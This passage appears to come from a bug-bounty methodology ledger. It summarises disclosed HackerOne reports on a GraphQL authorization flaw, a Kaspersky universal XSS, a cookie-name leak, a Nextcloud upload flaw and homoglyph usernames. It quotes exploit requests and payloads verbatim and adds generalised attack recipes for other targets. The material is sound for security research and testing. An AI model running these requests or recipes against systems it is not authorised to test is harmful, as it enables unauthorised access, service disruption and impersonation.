This includes any private programs that use the Gateway product and have a published External Program."
  2. THE VULNERABLE REQUEST, verbatim (GraphQL over POST):
     `POST /graphql? HTTP/1.1` / `Host: hackerone.com` /
     `{"query":"mutation updateState($input_0:UpdateGatewayProgramStateInput!) {updateGatewayProgramState(input:$input_0) { team { handle } } }","variables":{"input_0":{"team_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","vpn_suspended":false,"clientMutationId":"0"}}}`
  3. THE PARAMETER, verbatim: "Replace the `team_id` (base64 encoded) with a team ID that you have access to. For most programs, this will result in a 500 internal server error being returned because the micro service handling VPN configurations can't find the program it needs to update. For programs that use the Gateway product it'll successfully update the VPN status as per the `vpn_suspended` boolean in the GraphQL query."
  4. THE ROOT CAUSE IN THE MUTATION, verbatim: "The vulnerability stems from the fact that the interactors, called by the mutation, do not implement any kind of authorization. The mutation fetches the team from the protected schema, but with a scope that is too broad. Instead of limiting it to programs the current user can manage, it'll return any team that the user can see."
  5. THE MUTATION CODE, verbatim: `def resolve(team_id:, vpn_suspended:)` / `current_user = context[:current_user]` / `unsafe_team = context.schema.object_from_id(team_id, context)` / `safe_team = ProtectedAttribute::SchemaUtility.use_protected_schema(requester: current_user) do` / `context[:tics].teams_i_can_see.find unsafe_team.id # <-- incorrectly scoped` / `end` / `if vpn_suspended` / `Interactors::Vpn::SuspendProgram.interact team: safe_team, as_user: current_user` / `else` / `Interactors::Vpn::ResumeProgram.interact team: safe_team, as_user: current_user` / `end`
  6. THE INTERACTOR CODE, verbatim: `module Interactors` / `module Vpn` / `class SuspendProgram < HackeroneInteractor` / `skip_authorization # <-- authorization check is skipped` / `attribute :team, Team, required: true` / `private` / `def execute` / `vpn_client.suspend_program(team.id)` / `team.update(vpn_suspended: true)` / `end` — and the report notes `app/backend/interactors/vpn/resume_program.rb` is "nearly identical" and "also skips the required authorization check".
  7. THE IMPACT, verbatim: "A user can suspend and resume the HackerOne Gateway product for any program they have access to in the situation the program leverages the Gateway product."
DETECTION SIGNAL: a GraphQL mutation whose INPUT carries an object id (`team_id`, `projectId`, `org_id`, `accountId`) that the caller is expected to own/manage; a mutation that returns `team { handle }` / `project { name }` after a state change — a successful mutation response naming an object the caller does not administer is the first signal; an authorization library whose scope name is a VISIBILITY scope (`*_i_can_see`, `visible_*`, `readable_*`, `accessible_*`) applied where a MANAGEMENT scope (`*_i_can_manage`, `admin_*`, `maintain_*`) is required; an interactor/service class that calls `skip_authorization` / `skip_authorization_check` / `authorize!`-less execution while still performing a state change; a base64-encoded Relay global id (`Z2lkOi8v...`) that decodes to `gid://<app>/<Model>/<id>` — decode it to read the underlying numeric id and the model name; a `500` on non-Gateway teams vs a `200` on Gateway teams (the 500 is the tell that the object was RESOLVED but the downstream service could not act).
CHAIN: any authenticated user who can merely SEE a program (primitive: a low-privilege reporter account with read access to a private program that uses the Gateway product) -> the mutation resolves the target team through a `teams_i_can_see` scope, which is a VISIBILITY scope and therefore admits teams the caller cannot manage (primitive: the object is resolved without a management check) -> the resolved team is handed to an interactor that calls `skip_authorization`, so no authorization check runs anywhere on the path (escalation: the authorization layer is present but deliberately bypassed for this action) -> `vpn_client.suspend_program(team.id)` + `team.update(vpn_suspended: true)` mutate the program's Gateway/VPN state (escalation: a WRITE to a service-state object belonging to another team) -> the attacker can suspend and resume the Gateway/VPN for any program they can see, including private programs with a published External Program (impact: denial of the program's VPN/Gateway service and re-enablement at the attacker's will; program rated medium 5.0). Per doctrine §8: preconditions = any account with read ("see") access to the target program, no admin role, no victim interaction; gain = suspend/resume control over that program's Gateway service.
TRANSFERABLE TEST: for EVERY GraphQL API in scope — (1) enumerate mutations whose input type ends in `*Input!` and carries an object-id field (`team_id`, `projectId`, `organization_id`, `accountId`, `userId`); decode any base64 Relay global id to read the underlying model and numeric id; (2) as the LOWEST-privilege authenticated account, call the mutation against an object you can see but do not administer and set a benign boolean/state field (`vpn_suspended`, `enabled`, `paused`, `public`, `locked`, `allow_*`) to its CURRENT value first (a same-value write is non-destructive); (3) a `200` whose response returns the object's `handle`/`name` while your account has no admin role is the IDOR; a `500` for non-target objects and a `200` for target objects is the same signal; (4) repeat with the value FLIPPED on an object you own to prove the write is real, then revert it; (5) if the schema exposes the mutation's source or the app is open-source, grep for `skip_authorization` / `skip_authorization_check` in the interactor class that the mutation calls — the presence of that call on a state-changing interactor is the root cause. Rule: **a mutation that resolves its target with a `*_i_can_see`-style visibility scope and then hands it to an interactor marked `skip_authorization` is an IDOR on a service-state object — test the boolean state field with a same-value write first, then flip and revert on an object you own.**
DEDUPE: 0 hits across all three write targets for `717716`, `jobert`, `UpdateGatewayProgramState`, `updateGatewayProgramState`, `teams_i_can_see`, `skip_authorization`, `protected_schema`, `vpn_suspended` (the 7 existing `vpn_suspended` hits are this report's own body quoted in the assigned source list, not a ledger entry), `Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=`, `Gateway` (as a HackerOne product), `Interactors::Vpn`. Pre-existing material REVIEWED as related-but-distinct: the ledger's IDOR family records READ-side object swaps (ownership checks, tenant filters, archived UUIDs, §17.363 deeplink filename traversal) and WRITE-side moderation endpoints with a missing VISIBILITY check (§17.364); §17.368 is a directory-API IDOR exposing a reset token; NONE records a GraphQL MUTATION whose defect is a VISIBILITY-scope used where a MANAGEMENT-scope is required, and NONE records the `skip_authorization` interactor pattern. The `object_from_id` (9 hits) and `Service-Gateway`/`Gateway` (New Relic request-smuggling) material is unrelated. New general method -> §17.370.

SOURCE: https://hackerone.com/reports/463915  2026-11-10
ROUTE: `web_extract` on the live report page -> HTTP 422 ("The page was reached but content could not be extracted"); the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (1,608 B). Route that worked: the `.json` route.
STATUS: UNVERIFIED (not reproduced — no Kaspersky URL-Advisor component was driven this pass; every step and the recommendation below are verbatim from the report body).
CLASS: Universal XSS / client-side security misconfiguration — the URL Advisor interstitial UI is served AS FIRST-PARTY CONTENT ON EVERY DOMAIN (an injected frame under `www.google.com/<INJECT_ID>/ua/url_advisor_balloon.html`), its content is filled from a `window.postMessage()` message whose ORIGIN IS NEVER VALIDATED, and the message data is assigned as a LINK TARGET, so a malicious website can point that link at a `javascript:` URL and use clickjacking to make the user activate it — running code in the context of ANY domain (CWE-79 / CWE-346; Kaspersky labelled it Cross-site Scripting (XSS) - Generic, severity high, reporter `palant`, submitted 2018-12-17, disclosed 2019-08-28, asset Kaspersky Internet Security 19.0.0.1088 / Windows 10.0.17134, attack type Universal XSS, no privileges needed).
CORE METHOD (verbatim from the report body):
  1. THE FIRST-PARTY SERVING, verbatim: "In Microsoft Edge, URL Advisor UI is served as first-party content on every domain. So the XSS vulnerability I found in this UI automatically applies to all websites, it allows running code in the context of *any* domain."
  2. THE FRAME PATH, verbatim: "URL Advisor frame is located under `https://www.google.com/<INJECT_ID>/ua/url_advisor_balloon.html` and `https://www.yahoocom/<INJECT_ID>/ua/url_advisor_balloon.html` in Microsoft Edge (always the same INJECT_ID value)."
  3. THE MISSING ORIGIN CHECK, verbatim: "It gets its content from a message sent via `window.postMessage()` without validating message origin."
  4. THE SINK, verbatim: "Under some circumstances it will assign that data as link target, so a malicious website can make that link point to a javascript: URL. Clickjacking then allows making the user click that link - while sites like google.com use X-Frame-Options header to disallow framing, no such restrictions are in place for the url_advisor_balloon.html frame."
  5. THE REPRODUCTION, verbatim in substance: (step 1) download the attached `server.py` and `universal_xss.html`, run `server.py` (a rudimentary HTTP server on `http://localhost:5000/`); (step 2) edit `%WINDIR%\sysnative\drivers\etc\hosts` as administrator and add `127.0.0.1 www.google.example.com` — "Normally, you would just use a subdomain of a domain you own - the host name has to start with 'www.google.' for URL Advisor to apply to it"; (step 3) open Microsoft Edge and go to `http://www.google.example.com:5000/universal_xss.html`; (step 4) "As advised by the page, move your mouse and click somewhere on the page."
  6. THE RESULT, verbatim: "You will see an alert message saying: 'Hi, this is JavaScript code running on www.google.com.' That's the result of the code `alert('Hi, this JavaScript code is running on ' + document.domain)` executing in the context of the Google website. Injecting code into any other domain would have been easily possible as well."
  7. THE VENDOR-FIX DIRECTION, verbatim: "This user interface should never be served as first-party, even once the vulnerability here is fixed. Any XSS vulnerability in Kaspersky code automatically elevates to Universal XSS otherwise, this is too dangerous. Frankly, I don't see why it is done in this way with Microsoft Edge - in Firefox and Internet Explorer the same UI is always served via kis.v2.scr.kaspersky-labs.com, so vulnerabilities here don't affect other websites."
  8. THE IMPACT, verbatim: "A malicious website can easily make users click by pretending to be a game. And while the user clicks, they will be allowing the attackers to inject code into various internet domains and exfiltrating data in the background."
DETECTION SIGNAL: a browser-extension / AV / web-filter component that injects its OWN UI into every page it runs on and serves that UI from the HOST PAGE'S ORIGIN (a path like `/<constant-id>/ua/<widget>.html` under `www.google.com`, `www.yahoo.com`, or any site) rather than from an extension/vendor origin; a widget path containing a CONSTANT `INJECT_ID` that is identical across all sites; the widget reading its configuration/content from a `window.postMessage()` handler with NO `event.origin` check and NO channel/token binding; the postMessage data being assigned to a URL-bearing property (`location.href`, `a.href`, `link.target`, `window.open`); the widget frame lacking `X-Frame-Options`/CSP `frame-ancestors` so any site can frame and clickjack it; a hostname PREFIX GATE (`www.google.`, `www.bing.`) that decides whether the component activates — a gate on a STRING PREFIX is bypassable by owning a subdomain of the prefixed name.
CHAIN: a malicious website the victim visits (primitive: a page that can host an injected AV widget frame) -> the component serves its UI as first-party content on the attacker's chosen domain because the host name merely has to START WITH `www.google.` — the attacker registers `www.google.example.com` (primitive: the activation gate is a string PREFIX, not an exact-origin check, so the attacker can host the widget on a domain that satisfies it) -> the widget frame is created with the same constant `INJECT_ID` on every domain (escalation: the widget's location is predictable and its origin is the attacker's page) -> the attacker's page sends a `postMessage` to the widget with a `javascript:` URL as the link target; the widget handler assigns it WITHOUT validating `event.origin` (primitive: a missing origin check on a privileged message handler) -> the widget renders a clickable link whose target is `javascript:` (escalation: attacker-controlled code is now positioned to execute in the widget's context) -> clickjacking makes the user click it (escalation: user interaction converts the positioned payload into execution) -> the payload runs with `document.domain` = the host site's domain, e.g. `www.google.com` (impact: Universal XSS — arbitrary JavaScript in the origin of any website the component runs on, able to exfiltrate data in the background; program rated high). Per doctrine §8: preconditions = the victim has the component installed, uses Microsoft Edge (where the UI is first-party), and visits an attacker-controlled page whose hostname starts with the component's prefix; gain = script execution in the origin of an arbitrary domain.
TRANSFERABLE TEST: for EVERY browser extension / AV / web-filter / password-manager / banking-plugin component that injects UI into web pages — (1) enumerate the injected frame's URL from the page's DOM/network tab and check whether it is served from the HOST PAGE'S ORIGIN (`https://<site>/<constant-id>/<widget>.html`) or from an extension/vendor origin (`chrome-extension://`, `moz-extension://`, `kis.v2.scr.kaspersky-labs.com`); a host-page origin is the first signal; (2) check whether the activation gate is a hostname PREFIX (`www.google.`, `www.bing.`) rather than an exact origin — if so, register/obtain a domain that satisfies the prefix and confirm the widget still activates there; (3) open the widget frame directly and inspect its message handler: does it read `event.data` and assign it to a URL/link target with NO `event.origin` check? (4) send a `postMessage` from your own page to the widget with `{"link":"javascript:alert(document.domain)"}`-style data and see whether the widget renders a link whose `href` is your value; (5) check the widget frame's response for `X-Frame-Options`/CSP `frame-ancestors` — absence means any page can frame and clickjack it; (6) click the link (or simulate the click) and read `document.domain` in the alert. Rule: **a security component's injected UI is only as trusted as the page that hosts it — if the widget is served from the host page's origin, gated by a hostname prefix, filled by an unvalidated `postMessage`, and framable without `X-Frame-Options`, a malicious site turns it into a Universal XSS sink in any domain's origin.**
DEDUPE: 0 hits across all three write targets for `463915`, `url_advisor_balloon`, `INJECT_ID`, `URL Advisor`, `Universal XSS` (as a method), `kis.v2.scr.kaspersky-labs.com`, `www.google.example.com`, `clickjacking` (as a component of this chain), `palant`. Pre-existing material REVIEWED as related-but-distinct: the 95 `postMessage` hits in the ledger are origin-validation and `event.origin`-check classes on MESSAGE HANDLERS in web apps — they record the DEFENCE and its bypasses (§17.352 JS-unicode-escape, the §17.262 `javascript:`-scheme URL parameter, the §17.251 `location`/`document.URL` credential-concealment entry), but NONE records a CLIENT-SIDE SECURITY COMPONENT whose injected widget is served from the HOST PAGE'S ORIGIN with a CONSTANT `INJECT_ID`, a hostname-PREFIX activation gate, and a postMessage handler that assigns the message to a LINK TARGET — the Universal-XSS amplification step is absent everywhere. §17.366 (devicelock stored XSS) is server-side storage; §17.364 (LinkedIn flag endpoint) is a server-side visibility check. New general method -> §17.371.

SOURCE: https://hackerone.com/reports/310105  2026-11-10
ROUTE: `web_extract` on the live report page -> HTTP 200, the curl PoC and the Automattic comment rendered; the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (the 17.96 KiB `Set-Cookie` block was truncated in the extract but the entry's method is fully carried by the PoC line and the vendor's own comment). No fallback route needed.
STATUS: UNVERIFIED (not reproduced — no automattic.com request was made this pass; the PoC line and the vendor's root-cause sentence are verbatim from the report body and its comment thread).
CLASS: information disclosure with a cookie-store primitive — sending a cookie whose NAME IS A LOOSELY-EQUAL ZERO makes the server run its cookie-CLEARING routine and emit a `Set-Cookie: <name>=deleted; expires=...; Max-Age=0` line for EVERY cookie the application knows about, disclosing all 152 cookie NAMES (CWE-200 / CWE-1293 / CWE-20; Automattic labelled it Information Disclosure, severity low, reporter `albinowax`, submitted 2018-01-29, disclosed 2019-08-04, asset automattic.com).
CORE METHOD (verbatim from the report body):
  1. THE POC, verbatim: "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:"
  2. THE REQUEST, verbatim: `curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie`
  3. THE RESPONSE SHAPE, verbatim (redacted by the program in the disclosure): a block of `Set-Cookie: ██████=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; domain=.wordpress.com` lines — one per known cookie, all carrying `=deleted` / `Max-Age=0`, i.e. the DELETION routine fired for every cookie name the application has.
  4. THE VENDOR'S ROOT CAUSE, verbatim from the Automattic staff comment by `xknown`: "The code to remove cookies was relying on a loose comparison, something like" [the comparison code block is redacted to 73 bytes in the public page].
DETECTION SIGNAL: any application that CLEARS cookies by iterating a known list and emitting `Set-Cookie: <name>=deleted; Max-Age=0` — the tell is the deletion response block appearing at all; a cookie NAME that is a falsy/zero-like value (`0`, `""`, `false`, `null`, `0.0`, `"0"`) being accepted as a cookie name; a loose-comparison (`==`, `===` against `0`, truthiness, `in_array` without strict, `array_search` without strict) between an incoming cookie name and the list of cookies to clear; the response leaking the FULL cookie-name inventory of the application (a reconnaissance goldmine: session-cookie names, CSRF-cookie names, framework cookies) in one request.
CHAIN (NOT DOCUMENTED AS A HIGH/CRITICAL CHAIN — recorded as the first link of a chain and held as a lead per the CHAIN-ONLY rule): the primitive is a one-request disclosure of the application's ENTIRE cookie-name inventory (152 names) with no authentication and no user interaction (primitive: a falsy cookie name triggers the server's own deletion routine, and the routine echoes every known name back). The report publishes NO escalation: no session token is disclosed (only NAMES, never VALUES), no takeover, no privilege change. Per doctrine §2(b) and the CHAIN-ONLY rule, a bare inventory disclosure is a P4/P5 primitive and is recorded here ONLY as the entry point of a chain a later pass may complete — e.g. (a) a disclosed `__Host-`/`__Secure-` session-cookie NAME combined with the cookie-prefix-normalisation method (§17.239) to plant a forged twin from a subdomain; (b) a disclosed CSRF-cookie name combined with a CSRF-token leak to forge state-changing requests; (c) a disclosed framework/session cookie name used to target a session-fixation or cookie-tossing chain; (d) the names used to fingerprint the exact framework/version and pick its known session-handling bugs. None of these is documented in the report; none is asserted as a demonstrated impact. Per doctrine §8: preconditions = an unauthenticated HTTP request; gain = the cookie-name inventory only (no values).
TRANSFERABLE TEST: for EVERY web application whose response or cookie handling suggests a cookie-clearing routine — (1) send a request with a single cookie whose NAME is a zero-like falsy value (`Cookie: 0=1`, then `Cookie: =1`, `Cookie: false=1`, `Cookie: null=1`, `Cookie: 0.0=1`) and grep the response for `Set-Cookie:`; (2) count the `Set-Cookie: <name>=deleted` / `Max-Age=0` lines — a block of them naming cookies you never sent is the finding; (3) if the app is a known framework, diff the leaked names against that framework's default cookie inventory to identify the version/session backend; (4) then CHAIN, never stop here: feed each leaked session/CSRF-cookie NAME into the recorded cookie-prefix-normalisation (§17.239), cookie-sandwich (§17.248), phantom-`$Version` (§17.249) and duplicate-cookie-resolution tests, and into session-fixation/CSRF-token-reuse tests against those exact names. Rule: **a cookie-clearing routine that compares incoming cookie names loosely will echo the application's ENTIRE cookie inventory when handed a zero-like name — send `Cookie: 0=1` and read the `Set-Cookie: <name>=deleted` block, then use the leaked names as the input to a cookie-prefix / session-fixation chain.**
DEDUPE: 0 hits across all three write targets for `310105`, `albinowax`, `Cookie: 0=1`, `0=1` (as a cookie name), `Set-Cookie: deleted`, `Max-Age=0`, `loose comparison` (as a cookie-name comparison), `152 cookie`, `automattic.com`. Pre-existing material REVIEWED as related-but-distinct: §17.239 (the `__Host-`/`__Secure` cookie-PREFIX normalisation entry) is about planting a cookie whose NAME the server normalises into a protected one — a different primitive (name normalisation, not name disclosure); §17.248 (cookie sandwich via `$Version=1` quoted-value parsing) and §17.249 (the phantom `$Version` parser differential) are cookie-PARSING classes, not a deletion-routine name leak; the 9 `cookie name` hits are incidental mentions (a Django/ASP.NET trimming line, a cookie-flag hardening line) — NONE records a LOOSE-COMPARISON COOKIE-CLEARING ROUTINE that discloses the whole cookie inventory from a single falsy-name request. New general method -> §17.372.

SOURCE: https://hackerone.com/reports/3483708  2026-11-10
ROUTE: `web_extract` on the live report page -> HTTP 200, but `visibility: no-content` / `vulnerability_information` 0 B on the live `.json` route, so the page body is empty; the team's `summaries[0].content` on the same `.json` names the credited advisory `github.com/nextcloud/security-advisories/security/advisories/GHSA-45pj-p7x7-4mhc`, and the FULL advisory text was read this pass 2026-11-10 via the browser tool on that GitHub URL (the `web_extract` render of the advisory was truncated at the CVSS block, so the browser route supplied the Description/Impact section). Route that worked: the credited public advisory.
STATUS: UNVERIFIED (not reproduced — no Nextcloud instance was stood up this pass; the Impact wording is verbatim from the advisory and the endpoint shape is the standard public Nextcloud upload route, labelled as such).
CLASS: broken access control / CWE-284 on a FILE-UPLOAD endpoint — a bearer of a valid file-share token can reach the share OWNER's CHUNKED-UPLOAD temporary part files, i.e. read in-progress uploads that belong to another user (CWE-284; Nextcloud labelled it Improper Access Control - Generic, severity medium 6.3, reporter `pirikara`, submitted 2026-01-01, resolved 2026-04-24, disclosed 2026-06-07, CVE-2026-45157, asset nextcloud/server (SOURCE_CODE), CVSS:3.1 AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N, patched in 32.0.9 / 33.0.3 and the Enterprise 26.0.13.26-32.0.9 line).
CORE METHOD (the whole of what is public):
  1. THE FINDING, verbatim from the advisory: "When a malicious user has access to a file share of a user, they could use this share token to also access the chunking upload directly and see temporary part files during on going uploads."
  2. THE AFFECTED SURFACE, verbatim: "Package: Server (Nextcloud). Affected versions: >= 32.0.0, >= 33.0.0. Patched versions: 32.0.9, 33.0.3. Server (Nextcloud Enterprise): >= 26.0.0, >= 27.0.0, >= 28.0.0, >= 29.0.0, >= 30.0.0, >= 31.0.0, >= 32.0.0, >= 33.0.0 -> 26.0.13.26, 27.1.11.25, 28.0.14.17, 29.0.16.16, 30.0.17.9, 31.0.14.5, 32.0.9, 33.0.3."
  3. THE RATING, verbatim: "Severity Moderate 6.3 / 10. CVSS v3 base metrics: Attack vector Network, Attack complexity Low, Privileges required Low, User interaction Required, Scope Unchanged, Confidentiality High, Integrity Low, Availability None. CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N. Weaknesses: CWE-284."
  4. THE WORKAROUND, verbatim: "No workaround available."
  5. THE ENDPOINT FAMILY (NOT from the report body — no request shape is published anywhere; this is the standard public Nextcloud chunked-upload route, recorded so the entry is testable): Nextcloud uploads go to `/remote.php/dav/uploads/<userId>/<uploadId>/` (the DAV upload collection) or `/remote.php/dav/uploads/<userId>/<uploadId>/<partFileName>` for individual chunks; the share-token entry point is the public-share route `/index.php/s/<shareToken>/` and its DAV equivalent `/remote.php/dav/public-files/<shareToken>/`. The defect is that the AUTHORIZATION CHECK on the upload collection validates the SHARE TOKEN but not that the requested upload belongs to the share OWNER — the token's validity is treated as sufficient for the owner's chunk directory.
  6. THE ROOT-CAUSE SHAPE (inferred from the advisory's wording and labelled as such): the chunking-upload access control binds the request to the share token and resolves the target upload by its path segment, but the ownership check between the upload id and the share owner is missing, so any valid share token reaches any owner's chunk directory.
DETECTION SIGNAL: a file-sharing product with a CHUNKED-UPLOAD implementation (uploads split into part files under a per-user/per-upload directory) and a PUBLIC-SHARE token mechanism; an upload/part-file endpoint that accepts a share token and a path/upload id and returns part-file bytes; a `remote.php/dav/uploads/<user>/<uploadId>/...` (or `/uploads/<token>/<uploadId>/...`) route whose authorization only validates the token; an upload directory whose listing (a WebDAV `PROPFIND` or a directory index) returns entries for an upload id that is not the caller's; a share token that works on the share's file listing AND on the owner's upload collection.
CHAIN: a malicious user who has been given (or has obtained) a valid file share of another user (primitive: a low-privilege share recipient — the precondition is exactly the `PR:L` in the CVSS vector, and the victim must click/open the share, hence `UI:R`) -> the attacker replays the SAME share token against the chunked-upload endpoint instead of the share-file endpoint (primitive: the upload route validates the token but does not check that the upload belongs to the share owner) -> the endpoint resolves the owner's upload collection and returns the TEMPORARY PART FILES of an ONGOING upload (escalation: cross-user read of data the owner never shared — the part files are not part of the share and may be fragments of a document still being composed) -> the attacker reads partial/in-progress content of the owner's uploads (impact: confidentiality breach of unshared, in-progress user data; program rated medium 6.3, C:H). Per doctrine §8: preconditions = a valid share token for the victim's share (low privilege) and a victim who opens/interacts with the share; gain = read access to the share owner's temporary upload part files.
TRANSFERABLE TEST: on ANY file-sharing / sync product with chunked uploads and share links (Nextcloud, ownCloud, Seafile, a custom `/remote.php/dav/uploads/<user>/<uploadId>/` or `/uploads/<token>/<id>/` route) — (1) create a file share as user A and capture its token; (2) as user B (or unauthenticated, depending on the product), upload a LARGE file to your own account so it is split into chunked part files and note the upload directory/id from the network tab or the DAV route; (3) replay the share token against the UPLOAD route instead of the share-file route — `GET /remote.php/dav/uploads/<A's-userId>/<uploadId>/`, `PROPFIND` on that collection, and `GET /remote.php/dav/uploads/<A's-userId>/<uploadId>/<part>`; (4) a 200/207 with the owner's part files (or a listing of them) is the finding; (5) vary the upload id to enumerate the owner's other in-progress uploads, and test whether a share token from an UNRELATED share still works. Rule: **a chunked-upload route that validates the share token but not the upload's ownership is a cross-user read of unshared in-progress files — capture a share token, point it at the upload collection, and read the part files the owner never shared.**
DEDUPE: 0 hits across all three write targets for `3483708`, `pirikara`, `45pj`, `CVE-2026-45157`, `GHSA-45pj-p7x7-4mhc`, `chunking`, `share token` (as a class), `shareToken`, `temporary upload`, `part file`, `uploads/v1`, `remote.php/dav/uploads`, `public-files`, `Nextcloud Enterprise`, `32.0.9`. Pre-existing material REVIEWED as related-but-distinct: the ledger's Nextcloud entries are #3382343 (Out-of-Office API `userId` path param BOLA — a read of ANOTHER USER'S CALENDAR DATA through a path parameter, not an upload collection), #851807 (Nextcloud Talk command injection), #1170024 (an unauthenticated federation/OCM `notifications` endpoint trusting a `sharedSecret` -> rewrite a read-only federated share to read+write, §17.124), #3489490 (user_oidc ID4me missing JWT signature verification) and #3799010 (TaskProcessing callback authorization bypass letting an ex-member post as the Assistant Talk Bot) — NONE records a CHUNKED-UPLOAD collection whose share-token check fails to bind the upload to the share OWNER, and NONE records the "temporary part files of an ONGOING upload" as the exposed data. §17.363 (Basecamp deeplink filename traversal) is a client-side deeplink-as-filename sink; the ledger's `part file` (4 hits) and `uploads` (95 hits) hits are generic upload/recon material, not this authorization defect. New general method -> §17.373.

SOURCE: https://hackerone.com/reports/3434156  2026-11-10
ROUTE: `web_extract` on the live HTML page -> HTTP 200 but only the metadata shell rendered (no report body); the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL. Route that worked: the `.json` route.
STATUS: UNVERIFIED (not reproduced — no Revive Adserver instance was stood up this pass; every payload, the code pattern and the impact wording below are verbatim from the report body).
CLASS: authentication bypass / improper input validation on a USERNAME field — a username BLACKLIST that blocks control characters, DEL and whitespace only, so zero-width, bidi-override and homoglyph codepoints pass and a visually identical duplicate account can be created (CWE-20; HackerOne weakness "Improper Authentication - Generic", severity medium 5.4, reporter `kassem_s94`, submitted 2025-11-19, disclosed 2025-11-26, CVE-2025-55129, asset revive-adserver/revive-adserver (SOURCE_CODE), CVSS AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N).
CORE METHOD (verbatim from the report body):
  1. THE DEFECT, verbatim: "Affected Component: Username validation in user registration/creation / File: `lib/OA/Admin/UI/UserAccess.php` / Line: 116 / Current Pattern: `#[\\x00-\\x1F\\x7F\\s]#u`" — the check is a BLACKLIST of control characters, DEL and whitespace, not a whitelist of allowed characters.
  2. EXPLOIT 1 — Zero-Width Space (U+200B), verbatim: "Invisible Unicode character that creates duplicate accounts"; payload hex `61646d696ee2808b` = "admin" + `0xE2 0x80 0x8B`; the report's own test asserts `preg_match('#[\\x00-\\x1F\\x7F\\s]#u', $username)` does not match, i.e. "Result: PASSES - VULNERABLE!".
  3. EXPLOIT 2 — RTL Override (U+202E), verbatim: "Right-to-Left Override mark that reverses text display direction"; payload hex `61646d696ee280ae74657374` = "admin" + `0xE2 0x80 0xAE` + "test"; "Visual display: 'tset' + 'admin' (reversed!)"; the same blacklist misses it.
  4. EXPLOIT 3 — Cyrillic Homograph (U+0430), verbatim: "Cyrillic letter 'а' (U+0430) that looks identical to Latin 'a' (U+0061)"; payload hex `d0b0646d696e` = `0xD0 0xB0` + "dmin"; "Looks same? YES | Hex same? NO".
  5. THE CONTROL, verbatim: the report's Test 4 uses Ideographic Space (U+3000, hex `61646d696ee3808074657374`) and expects it BLOCKED — showing the blacklist does catch U+3000, i.e. the failure is specific to codepoints outside the listed ranges, not a total absence of validation.
  6. THE RECOMMENDED FIX, verbatim: replace the blacklist with a whitelist — `if (empty($this->request['login']) || strlen($this->request['login']) > 255 || !preg_match('/^[a-zA-Z0-9._@-]+$/D', $this->request['login']) || $this->request['login'] !== trim($this->request['login'])) { $this->aErrors = [$GLOBALS['strInvalidUsername']]; }` — plus "Unicode normalization (NFC) before validation", "Implement confusables detection", "Log suspicious username patterns", "Display hex representation in admin UI".
  7. THE IMPACT AS STATED, verbatim: "Creates account that looks identical to 'admin' visually / Bypasses username uniqueness constraints / Enables account enumeration attacks / Perfect for impersonation attacks" and "**MOST DANGEROUS** - Visually indistinguishable from 'admin' / Perfect phishing vector / Users cannot detect the fake account / Credential harvesting / Admin impersonation attacks".
DETECTION SIGNAL: a username / registration / profile-rename validation that is a BLACKLIST (a `preg_match` of forbidden ranges/characters) rather than a whitelist; a pattern of the shape `[\x00-\x1F\x7F\s]` or any "no spaces / no control characters" rule; a uniqueness check that compares the raw stored string; a user list or admin panel that renders the username as plain text (so confusables are invisible); a vendor "patch" that ADDS more forbidden ranges instead of switching to an allow-list — a follow-up report showing a second codepoint family still passing is the tell that the patch is insufficient.
CHAIN: an unauthenticated (or low-privilege) visitor reaches the registration / user-creation form (primitive: a public signup surface) -> the username is checked against a blacklist of control/whitespace characters only, so U+200B / U+202E / a Cyrillic homoglyph pass validation (primitive: the validator's character set is narrower than the renderer's) -> the account is created and the uniqueness constraint does not see a collision because the stored bytes differ from the real "admin" (escalation: a second, visually identical principal now exists) -> the attacker phishes or socially engineers using the lookalike account name, or enumerates which names are taken by testing confusable variants (impact as asserted by the reporter: impersonation / phishing / credential harvesting; program rated medium 5.4). Per doctrine §8: preconditions = access to the registration / user-creation endpoint, no admin role; gain = a duplicate, visually indistinguishable account name. HONESTY: the report DEMONSTRATES only the duplicate/confusable account creation; the impersonation -> phishing -> credential-harvest escalation is asserted by the reporter and is not shown end-to-end, so that part of the chain is a documented lead, not a demonstrated critical.
TRANSFERABLE TEST: on ANY registration / user-creation / profile-rename endpoint — (1) read the validation rule if the source is available (look for a `preg_match` blacklist of control/whitespace ranges, or a "no spaces" error message); (2) submit a username that appends or embeds a zero-width character (`admin` + U+200B, hex `61646d696ee2808b`), a bidi override (`admin` + U+202E + `test`), and a homoglyph (Cyrillic `а` U+0430 + `dmin`); (3) a 2xx / account-created response for a name that RENDERS identically to an existing privileged name is the finding; (4) confirm the stored bytes differ (`bin2hex`) so the uniqueness check is genuinely bypassed; (5) then CHAIN, never stop here: use the lookalike account to test whether the platform's own notification / mention / password-reset flows display the name with no confusable warning, and whether an administrator can distinguish it in the UI. Rule: **a username validator that blacklists control characters and whitespace but never normalises or allow-lists Unicode is bypassed by zero-width, bidi-override and homoglyph codepoints — register `admin`+U+200B and its Cyrillic homoglyph, and the duplicate visually-identical account is the finding.**
DEDUPE: 0 hits across all three write targets for `3434156`, `kassem_s94`, `UserAccess.php`, `d239a084`, `username validation`, `U+202E`, `RTL override`. Pre-existing hits REVIEWED as related-but-distinct: `U+200B` (3 hits) is §17.255's URL-VALIDATION normalisation codepoint set (a domain/allow-list bypass, not a username field); the `homograph`/`confusable` hits are #271324 (a signed-redirect canonicalisation mismatch over an IDN domain, not a username) and the HTTP/2 header case-fold confusables (ſ / Kelvin sign); the `impersonat` hits are CI pipeline-identity impersonation, a WebView `preview_url` token replay, a node-impersonation wallet theft and a split-credential ORM-NULL impersonation — NONE records a USERNAME blacklist bypass via zero-width / bidi / homoglyph. New general method -> §17.374.

SOURCE: https://hackerone.com/reports/2209750  2026-11-10
